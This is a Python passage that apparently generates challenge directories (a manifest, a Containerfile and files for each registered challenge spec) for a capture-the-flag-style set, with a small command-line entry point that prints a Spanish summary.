def write_all(out_dir: Path) -> list[Spec]:
    specs = [fn() for fn in REGISTRY]
    for spec in specs:
        root = out_dir / spec.slug
        (root / "files").mkdir(parents=True, exist_ok=True)
        (root / "challenge.toml").write_text(render_manifest(spec), encoding="utf-8", newline="\n")
        (root / "Containerfile").write_text(CONTAINERFILE, encoding="utf-8", newline="\n")
        for rel, content in spec.files.items():
            target = root / "files" / rel
            target.parent.mkdir(parents=True, exist_ok=True)
            if isinstance(content, bytes):
                target.write_bytes(content)
            else:
                target.write_text(content, encoding="utf-8", newline="\n")
    return specs


def main() -> None:
    out = Path(sys.argv[1]) if len(sys.argv) > 1 else DEFAULT_OUT
    specs = write_all(out)
    print(f"{len(specs)} retos generados en {out}")


if __name__ == "__main__":
    main()
